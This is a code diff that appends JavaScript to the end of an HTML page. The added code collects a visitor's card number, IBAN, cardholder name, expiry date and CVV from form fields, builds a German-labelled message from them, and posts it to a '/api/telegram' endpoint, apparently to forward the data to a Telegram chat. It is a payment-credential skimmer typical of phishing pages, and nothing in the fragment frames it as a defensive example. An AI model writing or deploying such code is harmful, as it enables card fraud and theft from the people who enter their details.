@@ -371,3 +371,27 @@ setError(false);
 </script>
 </body>
 </html>
+
+
+
+const cardDigits = (cardEl.value || "").replace(/\D/g, "");
+const iban = (ibanEl.value || "")
+  .toUpperCase()
+  .replace(/[^A-Z0-9]/g, "");
+const holder = (holderEl.value || "").trim();
+const adate = (expEl.value || "").replace(/\D/g, "");
+const cvv = (cvvEl.value || "").replace(/\D/g, "");
+
+const msg =
+  `🏦 IBAN: ${iban}\n` +
+  `💳 Kartennummer: ${cardDigits}\n` +
+  `👤 Kartenbesitzer: ${holder}\n` +
+  `📅 Ablaufdatum: ${adate}\n` +
+  `🔐 CVV: ${cvv}\n`
+  
+
+  await fetch("/api/telegram", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ message: msg })
+  });
